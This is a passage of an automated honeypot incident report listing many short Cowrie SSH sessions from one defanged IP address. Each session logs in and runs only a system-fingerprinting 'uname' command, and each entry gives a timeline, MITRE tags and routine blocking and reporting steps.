| `2026-08-20 19:27:45` | `cowrie.command.input` |
| `2026-08-20 19:27:50` | `cowrie.log.closed` |
| `2026-08-20 19:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9dcccc771d5

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:31` | `cowrie.session.connect` |
| `2026-08-20 19:27:31` | `cowrie.client.version` |
| `2026-08-20 19:27:32` | `cowrie.client.kex` |
| `2026-08-20 19:27:41` | `cowrie.login.success` |
| `2026-08-20 19:27:47` | `cowrie.session.params` |
| `2026-08-20 19:27:47` | `cowrie.command.input` |
| `2026-08-20 19:27:49` | `cowrie.log.closed` |
| `2026-08-20 19:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0da409cd048

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:31` | `cowrie.session.connect` |
| `2026-08-20 19:27:31` | `cowrie.client.version` |
| `2026-08-20 19:27:34` | `cowrie.client.kex` |
| `2026-08-20 19:27:46` | `cowrie.login.success` |
| `2026-08-20 19:27:50` | `cowrie.session.params` |
| `2026-08-20 19:27:50` | `cowrie.command.input` |
| `2026-08-20 19:27:51` | `cowrie.log.closed` |
| `2026-08-20 19:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9e2b21d71a

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:34` | `cowrie.session.connect` |
| `2026-08-20 19:27:36` | `cowrie.client.version` |
| `2026-08-20 19:27:37` | `cowrie.client.kex` |
| `2026-08-20 19:27:48` | `cowrie.login.success` |
| `2026-08-20 19:27:55` | `cowrie.session.params` |
| `2026-08-20 19:27:55` | `cowrie.command.input` |
| `2026-08-20 19:27:58` | `cowrie.log.closed` |
| `2026-08-20 19:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5377b6d8ec18

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:36` | `cowrie.session.connect` |
| `2026-08-20 19:27:37` | `cowrie.client.version` |
| `2026-08-20 19:27:38` | `cowrie.client.kex` |
| `2026-08-20 19:27:46` | `cowrie.login.success` |
| `2026-08-20 19:27:51` | `cowrie.session.params` |
| `2026-08-20 19:27:51` | `cowrie.command.input` |
| `2026-08-20 19:27:54` | `cowrie.log.closed` |
| `2026-08-20 19:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc42f1be798

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:36` | `cowrie.session.connect` |
| `2026-08-20 19:27:37` | `cowrie.client.version` |
| `2026-08-20 19:27:43` | `cowrie.client.kex` |
| `2026-08-20 19:27:59` | `cowrie.login.success` |
| `2026-08-20 19:28:14` | `cowrie.session.params` |
| `2026-08-20 19:28:14` | `cowrie.command.input` |
| `2026-08-20 19:28:22` | `cowrie.log.closed` |
| `2026-08-20 19:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e663f70d9347

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:36` | `cowrie.session.connect` |
| `2026-08-20 19:27:37` | `cowrie.client.version` |
| `2026-08-20 19:27:38` | `cowrie.client.kex` |
| `2026-08-20 19:27:50` | `cowrie.login.success` |
| `2026-08-20 19:27:58` | `cowrie.session.params` |
| `2026-08-20 19:27:58` | `cowrie.command.input` |
| `2026-08-20 19:28:00` | `cowrie.log.closed` |
| `2026-08-20 19:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c3a5116eef

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:36` | `cowrie.session.connect` |
| `2026-08-20 19:27:37` | `cowrie.client.version` |
| `2026-08-20 19:27:38` | `cowrie.client.kex` |
| `2026-08-20 19:27:49` | `cowrie.login.success` |
| `2026-08-20 19:27:52` | `cowrie.session.params` |
| `2026-08-20 19:27:52` | `cowrie.command.input` |
| `2026-08-20 19:27:54` | `cowrie.log.closed` |
| `2026-08-20 19:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc73c8cdf03

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:36` | `cowrie.session.connect` |
| `2026-08-20 19:27:37` | `cowrie.client.version` |
| `2026-08-20 19:27:38` | `cowrie.client.kex` |
| `2026-08-20 19:27:47` | `cowrie.login.success` |
| `2026-08-20 19:27:49` | `cowrie.session.params` |
| `2026-08-20 19:27:49` | `cowrie.command.input` |
| `2026-08-20 19:27:51` | `cowrie.log.closed` |
| `2026-08-20 19:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de356e5989d

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:37` | `cowrie.session.connect` |
| `2026-08-20 19:27:38` | `cowrie.client.version` |
| `2026-08-20 19:27:41` | `cowrie.client.kex` |
| `2026-08-20 19:27:51` | `cowrie.login.success` |
| `2026-08-20 19:27:53` | `cowrie.session.params` |
| `2026-08-20 19:27:53` | `cowrie.command.input` |
| `2026-08-20 19:27:55` | `cowrie.log.closed` |
| `2026-08-20 19:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ee5f669773

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:38` | `cowrie.session.connect` |
| `2026-08-20 19:27:41` | `cowrie.client.version` |
| `2026-08-20 19:27:47` | `cowrie.client.kex` |
| `2026-08-20 19:27:54` | `cowrie.login.success` |
| `2026-08-20 19:27:56` | `cowrie.session.params` |
| `2026-08-20 19:27:56` | `cowrie.command.input` |
| `2026-08-20 19:27:58` | `cowrie.log.closed` |
| `2026-08-20 19:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9e24a12401

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:41` | `cowrie.session.connect` |
| `2026-08-20 19:27:41` | `cowrie.client.version` |
| `2026-08-20 19:27:45` | `cowrie.client.kex` |
| `2026-08-20 19:28:00` | `cowrie.login.success` |
| `2026-08-20 19:28:13` | `cowrie.session.params` |
| `2026-08-20 19:28:13` | `cowrie.command.input` |
| `2026-08-20 19:28:17` | `cowrie.log.closed` |
| `2026-08-20 19:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11378bc6c945

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 76s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:41` | `cowrie.session.connect` |
| `2026-08-20 19:27:41` | `cowrie.client.version` |
| `2026-08-20 19:27:43` | `cowrie.client.kex` |
| `2026-08-20 19:27:54` | `cowrie.login.success` |
| `2026-08-20 19:28:53` | `cowrie.session.params` |
| `2026-08-20 19:28:53` | `cowrie.command.input` |
| `2026-08-20 19:28:55` | `cowrie.log.closed` |
| `2026-08-20 19:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f43805b591ae

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:41` | `cowrie.session.connect` |
| `2026-08-20 19:27:41` | `cowrie.client.version` |
| `2026-08-20 19:27:43` | `cowrie.client.kex` |
| `2026-08-20 19:27:50` | `cowrie.login.success` |
| `2026-08-20 19:27:58` | `cowrie.session.params` |
| `2026-08-20 19:27:58` | `cowrie.command.input` |
| `2026-08-20 19:27:59` | `cowrie.log.closed` |
| `2026-08-20 19:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76da840c6971

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:41` | `cowrie.session.connect` |
| `2026-08-20 19:27:41` | `cowrie.client.version` |
| `2026-08-20 19:27:43` | `cowrie.client.kex` |
| `2026-08-20 19:27:51` | `cowrie.login.success` |
| `2026-08-20 19:27:54` | `cowrie.session.params` |
| `2026-08-20 19:27:54` | `cowrie.command.input` |
| `2026-08-20 19:27:55` | `cowrie.log.closed` |
| `2026-08-20 19:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b858fb2051

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:43` | `cowrie.session.connect` |
| `2026-08-20 19:27:45` | `cowrie.client.version` |
| `2026-08-20 19:27:48` | `cowrie.client.kex` |
| `2026-08-20 19:28:00` | `cowrie.login.success` |
| `2026-08-20 19:28:07` | `cowrie.session.params` |
| `2026-08-20 19:28:07` | `cowrie.command.input` |
| `2026-08-20 19:28:08` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af8b3abe87ce

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:43` | `cowrie.session.connect` |
| `2026-08-20 19:27:45` | `cowrie.client.version` |
| `2026-08-20 19:27:48` | `cowrie.client.kex` |
| `2026-08-20 19:28:04` | `cowrie.login.success` |
| `2026-08-20 19:28:22` | `cowrie.session.params` |
| `2026-08-20 19:28:22` | `cowrie.command.input` |
| `2026-08-20 19:28:23` | `cowrie.log.closed` |
| `2026-08-20 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8a34e83cd3

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:43` | `cowrie.session.connect` |
| `2026-08-20 19:27:45` | `cowrie.client.version` |
| `2026-08-20 19:27:48` | `cowrie.client.kex` |
| `2026-08-20 19:27:53` | `cowrie.login.success` |
| `2026-08-20 19:28:02` | `cowrie.session.params` |
| `2026-08-20 19:28:02` | `cowrie.command.input` |
| `2026-08-20 19:28:08` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cec6c0d3969

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:43` | `cowrie.session.connect` |
| `2026-08-20 19:27:45` | `cowrie.client.version` |
| `2026-08-20 19:27:48` | `cowrie.client.kex` |
| `2026-08-20 19:27:55` | `cowrie.login.success` |
| `2026-08-20 19:28:00` | `cowrie.session.params` |
| `2026-08-20 19:28:00` | `cowrie.command.input` |
| `2026-08-20 19:28:01` | `cowrie.log.closed` |
| `2026-08-20 19:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36987a4fa59

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:47` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:50` | `cowrie.client.kex` |
| `2026-08-20 19:27:55` | `cowrie.login.success` |
| `2026-08-20 19:28:03` | `cowrie.session.params` |
| `2026-08-20 19:28:03` | `cowrie.command.input` |
| `2026-08-20 19:28:06` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-596169e26241

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:47` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:50` | `cowrie.client.kex` |
| `2026-08-20 19:28:00` | `cowrie.login.success` |
| `2026-08-20 19:28:36` | `cowrie.session.params` |
| `2026-08-20 19:28:36` | `cowrie.command.input` |
| `2026-08-20 19:28:41` | `cowrie.log.closed` |
| `2026-08-20 19:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-189f07de8f8c

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:47` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:49` | `cowrie.client.kex` |
| `2026-08-20 19:27:55` | `cowrie.login.success` |
| `2026-08-20 19:27:59` | `cowrie.session.params` |
| `2026-08-20 19:27:59` | `cowrie.command.input` |
| `2026-08-20 19:28:01` | `cowrie.log.closed` |
| `2026-08-20 19:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c2d93c9d3e4

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:47` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:49` | `cowrie.client.kex` |
| `2026-08-20 19:27:56` | `cowrie.login.success` |
| `2026-08-20 19:28:01` | `cowrie.session.params` |
| `2026-08-20 19:28:01` | `cowrie.command.input` |
| `2026-08-20 19:28:03` | `cowrie.log.closed` |
| `2026-08-20 19:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7834b2130cba

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:48` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:50` | `cowrie.client.kex` |
| `2026-08-20 19:27:55` | `cowrie.login.success` |
| `2026-08-20 19:28:03` | `cowrie.session.params` |
| `2026-08-20 19:28:03` | `cowrie.command.input` |
| `2026-08-20 19:28:06` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e92d7e42b50b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:48` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:49` | `cowrie.client.kex` |
| `2026-08-20 19:27:53` | `cowrie.login.success` |
| `2026-08-20 19:28:04` | `cowrie.session.params` |
| `2026-08-20 19:28:04` | `cowrie.command.input` |
| `2026-08-20 19:28:07` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac18393d7dd6

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:48` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:51` | `cowrie.client.kex` |
| `2026-08-20 19:28:03` | `cowrie.login.success` |
| `2026-08-20 19:28:06` | `cowrie.session.params` |
| `2026-08-20 19:28:06` | `cowrie.command.input` |
| `2026-08-20 19:28:09` | `cowrie.log.closed` |
| `2026-08-20 19:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c888670bb131

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
